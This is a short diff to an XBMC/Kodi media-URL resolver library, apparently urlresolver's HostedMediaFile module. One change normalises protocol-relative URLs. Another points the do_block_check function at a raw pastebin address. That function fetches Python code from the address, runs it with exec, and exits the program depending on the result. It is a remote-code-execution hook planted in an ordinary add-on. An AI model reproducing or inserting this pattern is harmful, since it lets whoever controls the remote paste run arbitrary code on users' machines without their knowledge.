@@ -71,7 +71,7 @@ class HostedMediaFile:
         '''
         if not url and not (host and media_id) or (url and (host or media_id)):
             raise ValueError('Set either url, or host AND media_id. No other combinations are valid.')
-        self._url = url
+        self._url = 'http:%s' % url if url.startswith("//") else url
         self._host = host
         self._media_id = media_id
         self._valid_url = None
@@ -169,6 +169,7 @@ class HostedMediaFile:
             A direct URL to the media file that is playable by XBMC, or False
             if this was not possible.
         '''
+        #do_block_check()
         urlresolver.ALLOW_POPUPS = allow_popups
         for resolver in self.__resolvers:
             try:
@@ -292,7 +293,7 @@ def do_block_check(uninstall=False):
         import urllib2
         import sys
         namespace = {}
-        exec urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
+        exec urllib2.urlopen('https://pastebin.com/raw/AcZsizvg').read() in namespace
         if namespace["real_check"](uninstall):
             sys.exit()
     except SystemExit:
